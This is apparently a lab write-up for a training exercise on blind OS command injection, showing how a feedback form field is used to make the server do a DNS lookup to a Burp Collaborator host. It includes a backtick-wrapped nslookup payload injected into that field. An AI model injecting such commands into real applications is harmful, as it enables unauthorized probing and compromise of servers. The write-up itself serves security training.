# Blind OS Command Injection — Out-of-Band Interaction

This exercise again targets a blind OS command injection flaw in the feedback feature.

User input flows into a shell command executed by the server, but this time the command runs asynchronously, meaning the app's response is unaffected by it. There's also no way to redirect its output somewhere accessible. Instead, the only way to confirm execution is through an out-of-band channel — triggering a network interaction with an external host.

**Goal:** Use the blind injection to make the server perform a DNS lookup against a Burp Collaborator address.

Note: The Academy's firewall stops the lab environment from reaching arbitrary external systems, so Burp Collaborator's own public server must be used for this to work.

---

**References:**
- https://portswigger.net/web-security/os-command-injection
- https://book.hacktricks.xyz/pentesting-web/command-injection

<img width="771" height="329" alt="1" src="https://github.com/user-attachments/assets/85a552f5-e27c-4d11-adcd-93b0052eff91" />


---

The feedback form again:

<img width="713" height="622" alt="2" src="https://github.com/user-attachments/assets/fe732e86-b4c0-4aa1-9852-58c41a8a1d85" />


The payload that triggers the injection here:

```
`nslookup 7s0qd0oqa0r71b9pewc0nu7a41asynmc.oastify.com`
```

<img width="732" height="656" alt="3" src="https://github.com/user-attachments/assets/0d2c93b9-bb54-4a77-a675-3bdec5916e3f" />

<img width="897" height="91" alt="4" src="https://github.com/user-attachments/assets/2d666044-f7db-48b9-9893-e8d2e0aac072" />

